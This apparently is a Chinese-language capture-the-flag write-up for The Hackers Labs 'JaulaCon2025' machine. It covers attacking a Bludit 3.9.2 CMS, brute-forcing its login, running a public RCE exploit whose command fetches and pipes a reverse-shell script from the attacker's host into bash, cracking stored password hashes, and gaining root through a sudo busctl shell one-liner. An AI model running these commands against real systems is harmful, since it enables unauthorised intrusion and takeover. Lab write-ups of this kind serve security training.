# JaulaCon2025

2025.03.29 https://thehackerslabs.com/jaulacon2025/

[video](https://www.bilibili.com/video/BV1BfZwYWESw/?spm_id_from=333.1387.collection.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

jaulacon2025.thl 添加到 hosts 中， 发现 CMS BLUDIT 3.9.2 有一些漏洞但是都需要有登陆凭据。

https://github.com/ColdFusionX/CVE-2019-17240_Bludit-BF-Bypass/blob/main/exploit.py

经过搜索这个 cms 默认管理员是 admin，但是没有爆破出来登陆密码。在首页上只有一个显示 Jaulacon2025 ，也可能是用户名的提示，尝试爆破登陆密码:

```
python3 exploit.py -l http://jaulacon2025.thl/admin/login.php -u user -p ~/tools/dict/pass5000.txt|grep -A 3 -B 3 'SUCCESS'

Brute Force: Testing -> Jaulacon2025:cassandra
```

获得凭据后，可以执行 rce，得到反弹的 shell:

```
searchsploit -m 48568

python3 48568.py -u http://jaulacon2025.thl -user Jaulacon2025 -pass cassandra -c 'wget -q -O- http://192.168.5.3/shell/5.3/8888.sh|bash'
```

普通用户 JaulaCon2025 目录中的 user flag 目前没权限读取。在 web 管理后台上发现也创建了一个 JaulaCon2025 用户，可能密码相同，寻找这个 web 用户的密码。

www-data@JaulaCon2025:/var/www/html/bl-content/databases$ cat users.php

```json
"admin": {
        "password": "67def80155faa894bfb132889e3825a2718db22f",
        "salt": "67e2f74795e73",
    },
"Jaulacon2025": {
        "password": "a0fcd99fe4a21f30abd2053b1cf796da628e4e7e",
        "salt": "bo22u72!",
    },
"JaulaCon2025": {
        "password": "551211bcd6ef18e32742a73fcb85430b",
        "salt": "jejej",
    }
```

这里发现它的密码加密算法: https://raw.githubusercontent.com/bludit/password-recovery-tool/master/recovery.php

```
$salt = uniqid();
$password = md5(uniqid());
$passwordHash = sha1($password.$salt);
$decode['admin']['salt'] = $salt;
$decode['admin']['password'] = $passwordHash;
$decode['admin']['role'] = 'admin';
```

对应 hashcat 中模式是 110 , 551211bcd6ef18e32742a73fcb85430b:jejej 但是没出来，哈希长度都不对。 看看能不能找到 551211bcd6ef18e32742a73fcb85430b 的明文，结果是 Brutales ，可以切换到 JaulaCon2025

拿到 user flag：

```
JaulaCon2025@JaulaCon2025:~$ cat  user.txt
368409a919088e8707d0617365156184  -
```

sudo -l /usr/bin/busctl

```
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

拿到 root：

```
# cat root.txt
097fac9db83a1806f3355cf95227992a  -
```
